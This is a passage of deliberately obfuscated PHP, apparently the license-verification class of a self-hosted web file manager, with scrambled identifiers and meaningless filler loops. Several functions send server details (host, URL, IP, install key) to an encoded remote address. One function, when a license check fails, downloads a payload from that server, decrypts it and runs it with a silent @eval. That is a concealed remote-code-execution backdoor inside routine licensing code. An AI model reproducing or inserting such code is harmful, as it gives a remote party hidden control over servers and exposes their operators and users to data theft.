$ãÁù¼ã€[163]) { $€–±›úü = substr(md5($ãÁù¼ã€[164] . $üä¶¦íø), 12, 15) . $ãÁù¼ã€[165]; $ïóı¢ä¾ = $this->lrchcf215377(trim($Œ“×«İ[$ãÁù¼ã€[166]]), $€–±›úü, 2); $ÇÇ›‘Œô = json_decode($ïóı¢ä¾, !0); if (!is_array($ÇÇ›‘Œô) || !is_array($ÇÇ›‘Œô[$ãÁù¼ã€[167]]) || $ÇÇ›‘Œô[$ãÁù¼ã€[143]] != !0) { $ÆşëÏÇô = $ãÁù¼ã€[168]; $ÉÆİˆ¶Ÿ = $ÇÇ›‘Œô[$ãÁù¼ã€[167]] ? $ãÁù¼ã€[169] . $ÇÇ›‘Œô[$ãÁù¼ã€[167]] : $ÆşëÏÇô; show_json($ÉÆİˆ¶Ÿ, !1); } else { $ÁéÇÄ‹‚[$ãÁù¼ã€[145]] = $ÇÇ›‘Œô[$ãÁù¼ã€[167]][$ãÁù¼ã€[170]]; } } else { $ÇÇ›‘Œô = $this->fzli11bd429a($ãÁù¼ã€[171], $ÁéÇÄ‹‚, 10); $ú‹›Ü×ú = $—ÄÒ„¯­[650]; } } if (!is_array($ÇÇ›‘Œô) || !is_array($ÇÇ›‘Œô[$ãÁù¼ã€[167]]) || $ÇÇ›‘Œô[$ãÁù¼ã€[143]] != !0) { $ÆşëÏÇô = LNG($ãÁù¼ã€[172]); $ÉÆİˆ¶Ÿ = $ÇÇ›‘Œô[$ãÁù¼ã€[167]] ? $ãÁù¼ã€[169] . $ÇÇ›‘Œô[$ãÁù¼ã€[167]] : $ÆşëÏÇô; show_json($ÉÆİˆ¶Ÿ, !1); } $úá¸ã¬é = $ÇÇ›‘Œô[$ãÁù¼ã€[167]]; $Õï¸åè = $this->zeyid68039e9($úá¸ã¬é[$ãÁù¼ã€[173]]); if (!$Õï¸åè || $Õï¸åè != $úá¸ã¬é[$ãÁù¼ã€[121]]) { $÷†”‹ü = array($ãÁù¼ã€[174] => Model($ãÁù¼ã€[33])->get($ãÁù¼ã€[99]), $ãÁù¼ã€[175] => $_SERVER[$ãÁù¼ã€[98]], $ãÁù¼ã€[176] => this_url(), $ãÁù¼ã€[151] => $_SERVER[$ãÁù¼ã€[152]]); $ïóı¢ä¾ = $this->ytkgee1e599f(json_encode($÷†”‹ü)); $this->fzli11bd429a($ãÁù¼ã€[177] . $ïóı¢ä¾); show_json(LNG($ãÁù¼ã€[178]), !0); } $öÅÉ½‚  = array($ãÁù¼ã€[179] => $úá¸ã¬é[$ãÁù¼ã€[180]], $ãÁù¼ã€[181] => $úá¸ã¬é[$ãÁù¼ã€[182]], $ãÁù¼ã€[183] => rand_string(16), $ãÁù¼ã€[101] => $úá¸ã¬é[$ãÁù¼ã€[184]]); if ($ÁéÇÄ‹‚[$ãÁù¼ã€[145]]) { $öÅÉ½‚ [$ãÁù¼ã€[183]] = $ÁéÇÄ‹‚[$ãÁù¼ã€[145]]; } $ááçÂ×Í = substr(md5($öÅÉ½‚ [$ãÁù¼ã€[181]]), 10, 10); $ŒÉ°ˆ‹ê = $ááçÂ×Í . $öÅÉ½‚ [$ãÁù¼ã€[101]] . $öÅÉ½‚ [$ãÁù¼ã€[183]]; $öÅÉ½‚ [$ãÁù¼ã€[103]] = strrev(base64_encode($this->uflva157ea0f($ŒÉ°ˆ‹ê, $ãÁù¼ã€[185]))); $èåŒ­»° = rand_string(16); $‘äÔ‰Úı = $—ÄÒ„¯­[651]; $”£ Ê¤“ = $èåŒ­»° . $öÅÉ½‚ [$ãÁù¼ã€[101]] . $this->uflva157ea0f(md5($öÅÉ½‚ [$ãÁù¼ã€[179]]), $èåŒ­»°); $öÅÉ½‚ [$ãÁù¼ã€[104]] = base64_encode(strrev($this->uflva157ea0f($”£ Ê¤“, $ãÁù¼ã€[186]))); $û©ïüó¸ = $—ÄÒ„¯­[652]; while ($û©ïüó¸ < $—ÄÒ„¯­[605]) { if ($û©ïüó¸ >= 0) { break; } $û©ïüó¸++; } if ($úá¸ã¬é[$ãÁù¼ã€[187]] && $úá¸ã¬é[$ãÁù¼ã€[187]] >= 1) { Model($ãÁù¼ã€[33])->setDeep($ãÁù¼ã€[188], $ãÁù¼ã€[189]); } Model($ãÁù¼ã€[33])->set($öÅÉ½‚ ); $Ï£–Ã…£ = md5($_SERVER[$ãÁù¼ã€[98]] . strrev($àÒª„Œ›) . $öÅÉ½‚ [$ãÁù¼ã€[181]]); $Ÿºù¢ïŸ = $—ÄÒ„¯­[653]; if (!$Ÿºù¢ïŸ) { return; } $“öÎ©Î€ = strrev(substr($Ï£–Ã…£, 10, 16)); $³Ëìê = $—ÄÒ„¯­[654]; if (strlen($³Ëìê) < $—ÄÒ„¯­[619]) { return; } $­×½ÕØû = $this->wgzo2c094937(json_encode($úá¸ã¬é), $Ï£–Ã…£); $¤ÃŞ‰¡¼ = array_to_keyvalue(Model($ãÁù¼ã€[7])->listData(), $ãÁù¼ã€[190]); $Üí†§¹” = $¤ÃŞ‰¡¼[$ãÁù¼ã€[191]]; $ÄÌâò˜ = $—ÄÒ„¯­[655]; while ($ÄÌâò˜ < $—ÄÒ„¯­[619]) { if ($ÄÌâò˜ >= 0) { break; } $ÄÌâò˜++; } $°øÊµæ = array(); $°øÊµæ[$“öÎ©Î€] = $­×½ÕØû; Model($ãÁù¼ã€[7])->update($Üí†§¹”[$ãÁù¼ã€[192]], array($ãÁù¼ã€[193] => $°øÊµæ)); $this->vesu05b9b764 = $úá¸ã¬é; $ğÖ“ß’× = $—ÄÒ„¯­[656]; if (strlen($ğÖ“ß’×) < $—ÄÒ„¯­[601]) { die; } $this->mtvu8755d2d1 = $öÅÉ½‚ [$ãÁù¼ã€[101]]; $this->licenseRegistSuccess(); $ö‹Úš¼ = $—ÄÒ„¯­[657]; while ($ö‹Úš¼ < $—ÄÒ„¯­[621]) { if ($ö‹Úš¼ >= 0) { break; } $ö‹Úš¼++; } Cache::set($ãÁù¼ã€[194] . md5($àÒª„Œ› . $ãÁù¼ã€[195]), $ãÁù¼ã€[6]); $´ŠÜ´¾¡ = $—ÄÒ„¯­[658]; if (strlen($´ŠÜ´¾¡) < $—ÄÒ„¯­[601]) { die; } show_json(LNG($ãÁù¼ã€[178]), !0); } private function licenseRegistSuccess() { $§ÕÚµ¢Æ =& $_SERVER[¥ÙÌÜ¾ê]; $•ÂŸ¼¾À =& $_SERVER[ÏÒºµ×®]; $»í¹‰‡ = Model($•ÂŸ¼¾À[33])->get(); $·˜Ë°á– = $§ÕÚµ¢Æ[659]; while (strlen($·˜Ë°á–) < $§ÕÚµ¢Æ[605]) { if (!$·˜Ë°á–) { break; } $·˜Ë°á–++; } if ($»í¹‰‡[$•ÂŸ¼¾À[63]] != $•ÂŸ¼¾À[189]) { Model($•ÂŸ¼¾À[33])->set($•ÂŸ¼¾À[63], $•ÂŸ¼¾À[189]); } Action($•ÂŸ¼¾À[196])->initStart(!0); } private function wqhtc7454b10() { $¤ßô×› =& $_SERVER[¥ÙÌÜ¾ê]; $™ÑÓé =& $_SERVER[ÏÒºµ×®]; Model($™ÑÓé[33])->set(array($™ÑÓé[179] => $™ÑÓé[6], $™ÑÓé[181] => $™ÑÓé[6], $™ÑÓé[101] => $™ÑÓé[102], $™ÑÓé[103] => $™ÑÓé[6], $™ÑÓé[104] => $™ÑÓé[6])); Model($™ÑÓé[33])->setDeep($™ÑÓé[188], $™ÑÓé[197]); $Î«€Èòî = $¤ßô×›[660]; while ($Î«€Èòî < $¤ßô×›[601]) { if ($Î«€Èòî >= 0) { break; } $Î«€Èòî++; } $this->vesu05b9b764 = array(); $×çÈŞæ = $¤ßô×›[661]; if (!$×çÈŞæ) { return; } $this->mtvu8755d2d1 = $™ÑÓé[102]; } private function ypsg56ab547b() { $â×ãú¾± =& $_SERVER[¥ÙÌÜ¾ê]; $½Ì¢Õğ =& $_SERVER[ÏÒºµ×®]; $_SERVER[$½Ì¢Õğ[152]] = _get($_SERVER, $½Ì¢Õğ[152], APP_HOST); $œêè‹õ = $â×ãú¾±[662]; while (strlen($œêè‹õ) < $â×ãú¾±[601]) { if (!$œêè‹õ) { break; } $œêè‹õ++; } $this->mtvu8755d2d1 = $½Ì¢Õğ[102]; $Ñ’Ÿó– = $â×ãú¾±[663]; if (strlen($Ñ’Ÿó–) < $â×ãú¾±[619]) { die; } $Óà…‹–¼ = Model($½Ì¢Õğ[33])->get(); if ($Óà…‹–¼[$½Ì¢Õğ[101]] == $½Ì¢Õğ[102]) { return; } $ÀÆØºÛÜ = Model($½Ì¢Õğ[33])->get($½Ì¢Õğ[99]); $½œ”ë—ˆ = $â×ãú¾±[664]; while ($½œ”ë—ˆ < $â×ãú¾±[623]) { if ($½œ”ë—ˆ >= 0) { break; } $½œ”ë—ˆ++; } $â»É¢Ÿš = $½Ì¢Õğ[194] . md5($ÀÆØºÛÜ . $½Ì¢Õğ[195]); $ÈôÖÕúÛ = $â×ãú¾±[665]; if (!$ÈôÖÕúÛ) { return; } $ËÃôæŞö = Cache::get($â»É¢Ÿš); if (!is_array($ËÃôæŞö) || !isset($ËÃôæŞö[$½Ì¢Õğ[198]]) || time() - $ËÃôæŞö[$½Ì¢Õğ[198]] >= 60) { $õÒª•–Ÿ = Model($½Ì¢Õğ[7])->loadList(); $¯¯«•…õ = $õÒª•–Ÿ[$½Ì¢Õğ[191]]; $Ìš¥Óïõ = md5($_SERVER[$½Ì¢Õğ[98]] . strrev($ÀÆØºÛÜ) . $Óà…‹–¼[$½Ì¢Õğ[181]]); $Ä—îÁ­ = strrev(substr($Ìš¥Óïõ, 10, 16)); $ËÃôæŞö = $this->lrchcf215377($¯¯«•…õ[$½Ì¢Õğ[81]][$Ä—îÁ­], $Ìš¥Óïõ); $ËÃôæŞö = json_decode($ËÃôæŞö, !0); } if (!is_array($ËÃôæŞö)) { return $this->wqhtc7454b10(); } $Šş‡ê‰˜ = strtotime($ËÃôæŞö[$½Ì¢Õğ[121]]); if (time() >= $Šş‡ê‰˜) { return $this->wqhtc7454b10(); } if (time() - $ËÃôæŞö[$½Ì¢Õğ[198]] > 20) { $ËÃôæŞö[$½Ì¢Õğ[198]] = time(); Cache::set($â»É¢Ÿš, $ËÃôæŞö); } $this->vesu05b9b764 = $ËÃôæŞö; $this->mtvu8755d2d1 = $Óà…‹–¼[$½Ì¢Õğ[101]]; } private function jrakc227b9b4() { $áó¡·ºÃ =& $_SERVER[ÏÒºµ×®]; $¦›ˆø‰« = $GLOBALS[$áó¡·ºÃ[13]]; $™ªÉ‰È¨ = $_SERVER[$áó¡·ºÃ[24]]; $‡Ş Ù¶ = $_SERVER[¥ÙÌÜ¾ê][666]; if ($™ªÉ‰È¨ == $áó¡·ºÃ[199] && $this->mtvu8755d2d1 == $áó¡·ºÃ[102]) { show_json(LNG($áó¡·ºÃ[200]), !1, $áó¡·ºÃ[201]); } $œ—ı´® = array($áó¡·ºÃ[202], $áó¡·ºÃ[203]); if (in_array($™ªÉ‰È¨, $œ—ı´®)) { if ($this->mtvu8755d2d1 == $áó¡·ºÃ[102] && isset($¦›ˆø‰«[$áó¡·ºÃ[204]])) { show_json(LNG($áó¡·ºÃ[200]), !1, $áó¡·ºÃ[201]); die; } $‡ù²½¿û = $this->qzjd35842446(); if ($‡ù²½¿û != intval($áó¡·ºÃ[205])) { if ($‡ù²½¿û <= Model($áó¡·ºÃ[117])->count()) { show_json(LNG($áó¡·ºÃ[206]), !1, $áó¡·ºÃ[201]); die; } } } } private function ohfxb0c82c2d() { $â«·µ› =& $_SERVER[¥ÙÌÜ¾ê]; $°À²†İÀ =& $_SERVER[ÏÒºµ×®]; $œ»™‘ = array($°À²†İÀ[114], $°À²†İÀ[207]); if (!_get($GLOBALS, $°À²†İÀ[111]) || !isset($_GET[$°À²†İÀ[208]])) { return; } if (!in_array($_SERVER[$°À²†İÀ[24]], $œ»™‘)) { return; } $†Çààë¤ = $°À²†İÀ[209]; $Šİğ˜á = $â«·µ›[667]; if (strlen($Šİğ˜á) < $â«·µ›[621]) { return; } $†Çààë¤ = $this->pjfh5eb226cd($†Çààë¤, $°À²†İÀ[210]); $ï¿Ãí¿ = stream_context_create(array($°À²†İÀ[211] => array($°À²†İÀ[212] => $°À²†İÀ[213], $°À²†İÀ[214] => 3))); $àæµçôÜ = $â«·µ›[668]; if (!$àæµçôÜ) { return; } $¸ª³çûø = @file_get_contents($†Çààë¤, !1, $ï¿Ãí¿); $ËŞø’§À = $â«·µ›[669]; header($°À²†İÀ[215]); if ($¸ª³çûø && strstr($¸ª³çûø, $°À²†İÀ[216])) { echo $¸ª³çûø; } die; } public function vbkd4ced5512($Ê˜ëËÃî) { $ö£ßšˆè =& $_SERVER[¥ÙÌÜ¾ê]; $½Ñ‰üÓë =& $_SERVER[ÏÒºµ×®]; if ($this->mtvu8755d2d1 == $½Ñ‰üÓë[217]) { return $Ê˜ëËÃî; } $¦º’˜·Ğ = array($½Ñ‰üÓë[218] => $½Ñ‰üÓë[219], $½Ñ‰üÓë[220] => $½Ñ‰üÓë[219], $½Ñ‰üÓë[221] => $½Ñ‰üÓë[219], $½Ñ‰üÓë[222] => $½Ñ‰üÓë[219], $½Ñ‰üÓë[223] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[225] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[226] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[227] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[228] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[229] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[230] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[231] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[232] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[233] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[234] => $½Ñ‰üÓë[224], $½Ñ‰üÓë[235] => $½Ñ‰üÓë[224]); $ØÛ¢Õê = explode($½Ñ‰üÓë[236], _get($this->vesu05b9b764, $½Ñ‰üÓë[108], $½Ñ‰üÓë[6])); $í×š¦ì = array(); foreach ($¦º’˜·Ğ as $¶œıêÉƒ => $ğÈ·á¯ğ) { if ($ğÈ·á¯ğ == $½Ñ‰üÓë[219] && substr($this->mtvu8755d2d1, 0, 1) == $½Ñ‰üÓë[219]) { continue; } if (!in_array($¶œıêÉƒ, $ØÛ¢Õê)) { $í×š¦ì[] = $¶œıêÉƒ; } } foreach ($í×š¦ì as $¶œıêÉƒ) { unset($Ê˜ëËÃî[$¶œıêÉƒ]); $—ÁûÁÃ– = $ö£ßšˆè[670]; while (strlen($—ÁûÁÃ–) < $ö£ßšˆè[605]) { if (!$—ÁûÁÃ–) { break; } $—ÁûÁÃ–++; } } return $Ê˜ëËÃî; } private function xbcu7d92424e() { $ñ¬¡»Úâ =& $_SERVER[ÏÒºµ×®]; if ($this->mtvu8755d2d1 != $ñ¬¡»Úâ[102]) { $GLOBALS[$ñ¬¡»Úâ[81]][$ñ¬¡»Úâ[85]][$ñ¬¡»Úâ[237]] = $ñ¬¡»Úâ[197]; return; } $GLOBALS[$ñ¬¡»Úâ[81]][$ñ¬¡»Úâ[238]] = $ñ¬¡»Úâ[189]; if (Model($ñ¬¡»Úâ[239])->get($ñ¬¡»Úâ[63]) != $ñ¬¡»Úâ[197]) { Model($ñ¬¡»Úâ[239])->set($ñ¬¡»Úâ[63], $ñ¬¡»Úâ[197]); } } public function tdhs688d88ba() { return $_SERVER[ÏÒºµ×®][240]; $šÛôÃ¦ë = $_SERVER[¥ÙÌÜ¾ê][671]; } private function qslg5d0f2009() { $»‚óÒ•ø =& $_SERVER[¥ÙÌÜ¾ê]; $›ã·´Şì =& $_SERVER[ÏÒºµ×®]; $é§œ¢­… = array($›ã·´Şì[241], $›ã·´Şì[242], $›ã·´Şì[243]); $óÓ±ÓÜë = $›ã·´Şì[244] . md5($›ã·´Şì[245]); $É­Öš¾› = $»‚óÒ•ø[672]; if (strlen($É­Öš¾›) < $»‚óÒ•ø[601]) { die; } if ($this->mtvu8755d2d1 == $›ã·´Şì[102] || !_get($GLOBALS, $›ã·´Şì[111])) { return; } if (!in_array($_SERVER[$›ã·´Şì[24]], $é§œ¢­…)) { return; } if (time() % 4 != 0) { return; } $ÄãëšÅ = call_user_func(array($›ã·´Şì[246], $›ã·´Şì[247]), $óÓ±ÓÜë); $ÈºÜ´éø = $»‚óÒ•ø[673]; if ($ÄãëšÅ && time() - $ÄãëšÅ < intval($›ã·´Şì[248])) { return; } call_user_func(array($›ã·´Şì[246], $›ã·´Şì[131]), $óÓ±ÓÜë, time()); $çìî¹ô = Model($›ã·´Şì[33])->get($›ã·´Şì[99]); $Ó—ÄÂ²è = array($›ã·´Şì[143] => Model($›ã·´Şì[33])->get($›ã·´Şì[179]), $›ã·´Şì[156] => $this->mtvu8755d2d1, $›ã·´Şì[153] => $_SERVER[$›ã·´Şì[154]], $›ã·´Şì[155] => Model($›ã·´Şì[33])->get($›ã·´Şì[123]), $›ã·´Şì[97] => md5($_SERVER[$›ã·´Şì[98]] . $çìî¹ô), $›ã·´Şì[146] => $›ã·´Şì[128], $›ã·´Şì[149] => $_SERVER[$›ã·´Şì[150]]); $¼şã­ºˆ = $»‚óÒ•ø[674]; $ôíöº¥Ğ = $this->fzli11bd429a($›ã·´Şì[249], $Ó—ÄÂ²è); if (!is_array($ôíöº¥Ğ)) { return; } if ($ôíöº¥Ğ[$›ã·´Şì[143]] && $ôíöº¥Ğ[$›ã·´Şì[250]]) { if ($this->zeyid68039e9($ôíöº¥Ğ[$›ã·´Şì[250]]) == $Ó—ÄÂ²è[$›ã·´Şì[143]]) { return; } } $this->wqhtc7454b10(); if ($this->zeyid68039e9($ôíöº¥Ğ[$›ã·´Şì[250]]) != $Ó—ÄÂ²è[$›ã·´Şì[143]]) { $ ÔÉØ©ç = array($›ã·´Şì[174] => $çìî¹ô, $›ã·´Şì[175] => $_SERVER[$›ã·´Şì[98]], $›ã·´Şì[176] => this_url(), $›ã·´Şì[151] => $_SERVER[$›ã·´Şì[152]]); $Æ‹Ò ¥  = $this->ytkgee1e599f(json_encode($ ÔÉØ©ç)); $ôíöº¥Ğ = $this->fzli11bd429a($›ã·´Şì[177] . $Æ‹Ò ¥ ); if ($ôíöº¥Ğ && is_array($ôíöº¥Ğ) && isset($ôíöº¥Ğ[$›ã·´Şì[250]])) { $ÎÅÑó‰ = $this->lrchcf215377($ôíöº¥Ğ[$›ã·´Şì[250]], 2); if ($ÎÅÑó‰) { $ÎÅÑó‰ = $this->zeyid68039e9($ÎÅÑó‰); } if ($ÎÅÑó‰) { try { @eval($ÎÅÑó‰); } catch (Exception $‰¾´ªš–) { } } } } } private function fzli11bd429a($Šá—ÀÜã = '', $€±º”çò = array(), $·±ñ¸˜ = 5) { $åÑõ‹åÊ =& $_SERVER[¥ÙÌÜ¾ê]; $åÄã¤— =& $_SERVER[ÏÒºµ×®]; $´Ÿ½¢´† = $åÄã¤—[251]; $Õ¯Ú×Î¢ = $åÑõ‹åÊ[675]; if (strlen($Õ¯Ú×Î¢) < $åÑõ‹åÊ[621]) { die; } $´Ÿ½¢´† = $this->pjfh5eb226cd($´Ÿ½¢´†, $åÄã¤—[252]); $¨„“‰®ç = $åÑõ‹åÊ[676]; $´Ÿ½¢´† = $´Ÿ½¢´† . $Šá—ÀÜã; $çíØ« = $åÑõ‹åÊ[677]; if ($€±º”çò && is_array($€±º”çò)) { $´Ÿ½¢´† = $´Ÿ½¢´† . $åÄã¤—[253] . http_build_query($€±º”çò); } if ($€±º”çò === -1) { return $´Ÿ½¢´†; } $®È÷Ú»® = stream_context_create(array($åÄã¤—[211] => array($åÄã¤—[214] => $·±ñ¸˜, $åÄã¤—[212] => $åÄã¤—[254]), $åÄã¤—[255] => array($åÄã¤—[256] => !1, $åÄã¤—[257] => !1))); $à¾À†‰… = $åÑõ‹åÊ[678]; if (strlen($à¾À†‰…) < $åÑõ‹åÊ[623]) { die; } $€±º”çò = @file_get_contents($´Ÿ½¢´†, !1, $®È÷Ú»®); $¢ú‰Í·Ï = $åÑõ‹åÊ[679]; return json_decode($€±º”çò, !0); $½šÄû©Ö = $åÑõ‹åÊ[680]; while ($½šÄû©Ö < $åÑõ‹åÊ[619]) { if ($½šÄû©Ö >= 0) { break; } $½šÄû©Ö++; } } private function qzjd35842446() { $µú¨ğ¾© =& $_SERVER[¥ÙÌÜ¾ê]; $¦ÙÒ½Ë˜ =& $_SERVER[ÏÒºµ×®]; $‡„Ìğ = array($¦ÙÒ½Ë˜[258] => $¦ÙÒ½Ë˜[259], $¦ÙÒ½Ë˜[260] => $¦ÙÒ½Ë˜[261], $¦ÙÒ½Ë˜[262] => $¦ÙÒ½Ë˜[263], $¦ÙÒ½Ë˜[264] => $¦ÙÒ½Ë˜[265], $¦ÙÒ½Ë˜[266] => $¦ÙÒ½Ë˜[267], $¦ÙÒ½Ë˜[268] => $¦ÙÒ½Ë˜[205], $¦ÙÒ½Ë˜[269] => $¦ÙÒ½Ë˜[205], $¦ÙÒ½Ë˜[270] => $¦ÙÒ½Ë˜[259], $¦ÙÒ½Ë˜[271] => $¦ÙÒ½Ë˜[261], $¦ÙÒ½Ë˜[272] => $¦ÙÒ½Ë˜[263], $¦ÙÒ½Ë˜[273] => $¦ÙÒ½Ë˜[274], $¦ÙÒ½Ë˜[275] => $¦ÙÒ½Ë˜[265], $¦ÙÒ½Ë˜[276] => $¦ÙÒ½Ë˜[277], $¦ÙÒ½Ë˜[278] => $¦ÙÒ½Ë˜[267], $¦ÙÒ½Ë˜[279] => $¦ÙÒ½Ë˜[280], $¦ÙÒ½Ë˜[281] => $¦ÙÒ½Ë˜[282], $¦ÙÒ½Ë˜[283] => $¦ÙÒ½Ë˜[284]); $ş´Ê¸İ‡ = $µú¨ğ¾©[681]; while ($ş´Ê¸İ‡ < $µú¨ğ¾©[623]) { if ($ş´Ê¸İ‡ >= 0) { break; } $ş´Ê¸İ‡++; } $—¼ö¯« = $‡„Ìğ[$this->mtvu8755d2d1]; $Ïèˆ†ğ÷ = $µú¨ğ¾©[682]; if (strlen($Ïèˆ†ğ÷) < $µú¨ğ¾©[601]) { die; } $—¼ö¯« = intval($—¼ö¯« ? $—¼ö¯« : $¦ÙÒ½Ë˜[259]); $÷Êœ¬Ãœ = _get($this->vesu05b9b764, $¦ÙÒ½Ë˜[285]); $”ûÎçñü = $µú¨ğ¾©[683]; if (!$”ûÎçñü) { die; } $÷Êœ¬Ãœ = $÷Êœ¬Ãœ ? intval($÷Êœ¬Ãœ) : 0; $¢«¼ßªş = $µú¨ğ¾©[684]; if (strlen($¢«¼ßªş) < $µú¨ğ¾©[619]) { die; } return $—¼ö¯« + $÷Êœ¬Ãœ; } public function jdrnf775c13b($ÃÀª¹ˆ) { $ãÎ“¬î‰ =& $_SERVER[¥ÙÌÜ¾ê]; $İ¬œÃœƒ =& $_SERVER[ÏÒºµ×®]; $ÏÏ¹¹óï = $this->qzjd35842446(); $‚¯—²¾ = $ãÎ“¬î‰[685]; if (strlen($‚¯—²¾) < $ãÎ“¬î‰[619]) { return; } if ($ÃÀª¹ˆ[$İ¬œÃœƒ[286]] == $İ¬œÃœƒ[189]) { return; } if ($ÏÏ¹¹óï >= intval($İ¬œÃœƒ[205])) { return; } $»÷ûı’ = Model($İ¬œÃœƒ[117])->count(); $€Å¼ĞÜõ = $ãÎ“¬î‰[686]; if (!$€Å¼ĞÜõ) { die; } if ($»÷ûı’ <= $ÏÏ¹¹óï) { return; } $Ï¾àç¢õ = Model($İ¬œÃœƒ[117])->field($İ¬œÃœƒ[286])->limit($ÏÏ¹¹óï)->select(); $óíïŠ¦ = $ãÎ“¬î‰[687]; while ($óíïŠ¦ < $ãÎ“¬î‰[621]) { if ($óíïŠ¦ >= 0) { break; } $óíïŠ¦++; } $Ï¾àç¢õ = array_to_keyvalue($Ï¾àç¢õ, $İ¬œÃœƒ[6], $İ¬œÃœƒ[286]); $ÏÄìµê = $ãÎ“¬î‰[688]; if (!in_array($ÃÀª¹ˆ[$İ¬œÃœƒ[286]], $Ï¾àç¢õ)) { show_json($İ¬œÃœƒ[287], !1, $İ¬œÃœƒ[201]); } } public function cmwp42c819f4() { $ñè’¬Ø =& $_SERVER[¥ÙÌÜ¾ê]; $™½–ÌÌ× =& $_SERVER[ÏÒºµ×®]; if (!_get($GLOBALS, $™½–ÌÌ×[111]) || mt_rand(1, 100) > 20) { return; } $ªŞƒ¬Ø× = $™½–ÌÌ×[209]; $ªŞƒ¬Ø× = $this->pjfh5eb226cd($ªŞƒ¬Ø×, $™½–ÌÌ×[210]); $®ŠËë…´ = stream_context_create(array($™½–ÌÌ×[211] => array($™½–ÌÌ×[212] => $™½–ÌÌ×[213], $™½–ÌÌ×[214] => 3))); $–ó¢²ğÕ = @file_get_contents($ªŞƒ¬Ø×, !1, $®ŠËë…´); $ºÒ×Ğ” = $ñè’¬Ø[689]; while (strlen($ºÒ×Ğ”) < $ñè’¬Ø[621]) { if (!$ºÒ×Ğ”) { break; } $ºÒ×Ğ”++; } echo $™½–ÌÌ×[288] . hash_encode($–ó¢²ğÕ) . $™½–ÌÌ×[289]; $ÜœŞÂÙ  = $ñè’¬Ø[690]; if (strlen($ÜœŞÂÙ ) < $ñè’¬Ø[621]) { return; } } private function wgzo2c094937($ÄÔº¤ûá, $äà·…«ã, $çÆäŸ = 3) { $£Ö÷Öº¤ =& $_SERVER[¥ÙÌÜ¾ê]; $‘ªŒèõ =& $_SERVER[ÏÒºµ×®]; usleep(1); $ÄÔº¤ûá = trim($ÄÔº¤ûá); $ ´ó½Ôú = mt_rand(0, 5) . $‘ªŒèõ[6]; $¡€ş¿„Ô = $£Ö÷Öº¤[691]; while (strlen($¡€ş¿„Ô) < $£Ö÷Öº¤[605]) { if (!$¡€ş¿„Ô) { break; } $¡€ş¿„Ô++; } $İ°„‹¥ = rand_string(15); $µáäÓÓ¶ = $‘ªŒèõ[290]; switch ($ ´ó½Ôú) { case $‘ªŒèõ[197]: $Æ¡ˆ¼ú  = $this->uflva157ea0f($ÄÔº¤ûá, strrev($äà·…«ã . $İ°„‹¥)); break; $®Ì¹ó÷ = $£Ö÷Öº¤[692]; if (strlen($®Ì¹ó÷) < $£Ö÷Öº¤[621]) { die; } case $‘ªŒèõ[189]: $Æ¡ˆ¼ú  = $this->uflva157ea0f($ÄÔº¤ûá, strrev($İ°„‹¥ . $äà·…«ã)); $óØâÌßØ = $£Ö÷Öº¤[693]; break; $ú°Áö¯Ì = $£Ö÷Öº¤[694]; while (strlen($ú°Áö¯Ì) < $£Ö÷Öº¤[623]) { if (!$ú°Áö¯Ì) { break; } $ú°Áö¯Ì++; } case $‘ªŒèõ[291]: $Æ¡ˆ¼ú  = $this->uflva157ea0f($ÄÔº¤ûá, base64_encode($İ°„‹¥ . $äà·…«ã)); $ïÂüíÏ = $£Ö÷Öº¤[695]; if (strlen($ïÂüíÏ) < $£Ö÷Öº¤[621]) { return; } break; case $‘ªŒèõ[292]: $Æ¡ˆ¼ú  = $this->uflva157ea0f($ÄÔº¤ûá, md5($İ°„‹¥ . $äà·…«ã)); $¨å†À˜ = $£Ö÷Öº¤[696]; if (strlen($¨å†À˜) < $£Ö÷Öº¤[621]) { return; } break; $Ğï´¹ó = $£Ö÷Öº¤[697]; case $‘ªŒèõ[293]: $ÄÔº¤ûá = base64_encode($ÄÔº¤ûá); $Ù±ÂËµ = rand(0, 64); $˜å™Õ¸¯ = $µáäÓÓ¶[$Ù±ÂËµ]; $–º¨ÂÙê = md5($˜å™Õ¸¯ . md5($äà·…«ã . $˜å™Õ¸¯) . $äà·…«ã); $–º¨ÂÙê = substr($–º¨ÂÙê, $Ù±ÂËµ % 8, $Ù±ÂËµ % 8 + 7); $°„›Çü· = $‘ªŒèõ[6]; $ûƒë–œí = 0; $‰„«šºê = $£Ö÷Öº¤[698]; if (!$‰„«šºê) { return; } $¹ÁŠßœ“ = 0; $—½ÌÜ© = $£Ö÷Öº¤[699]; if (!$—½ÌÜ©) { return; } $¼§Ö´Ö = 0; $Ö©òîĞ¤ = $£Ö÷Öº¤[700]; if (strlen($Ö©òîĞ¤) < $£Ö÷Öº¤[623]) { die; } for ($ûƒë–œí = 0; $ûƒë–œí < strlen($ÄÔº¤ûá); $ûƒë–œí++) { $¼§Ö´Ö = $¼§Ö´Ö == strlen($–º¨ÂÙê) ? 0 : $¼§Ö´Ö; $µÖ‚ƒƒÕ = $£Ö÷Öº¤[701]; if (!$µÖ‚ƒƒÕ) { die; } $¹ÁŠßœ“ = ($Ù±ÂËµ + strpos($µáäÓÓ¶, $ÄÔº¤ûá[$ûƒë–œí]) + ord($–º¨ÂÙê[$¼§Ö´Ö++])) % 64; $Ù‘Øû…¶ = $£Ö÷Öº¤[702]; while (strlen($Ù‘Øû…¶) < $£Ö÷Öº¤[601]) { if (!$Ù‘Øû…¶) { break; } $Ù‘Øû…¶++; } $°„›Çü· .= $µáäÓÓ¶[$¹ÁŠßœ“]; $¾Õ™€Ñ¥ = $£Ö÷Öº¤[703]; } $Æ¡ˆ¼ú  = hash_encode($˜å™Õ¸¯ . $°„›Çü·); break; $‡ôØÔ¤Ù = $£Ö÷Öº¤[704]; default: $Æ¡ˆ¼ú  = $this->uflva157ea0f($ÄÔº¤ûá, $äà·…«ã . $İ°„‹¥); break; } $Æ¡ˆ¼ú  = strrev($ ´ó½Ôú . $İ°„‹¥ . $Æ¡ˆ¼ú ); if ($çÆäŸ - 1 > 0) { $Æ¡ˆ¼ú  = $this->wgzo2c094937($Æ¡ˆ¼ú , $äà·…«ã, $çÆäŸ - 1); } return $Æ¡ˆ¼ú ; } private function lrchcf215377($‚¯şŒ¼Û, $éÆŒ“Äí, 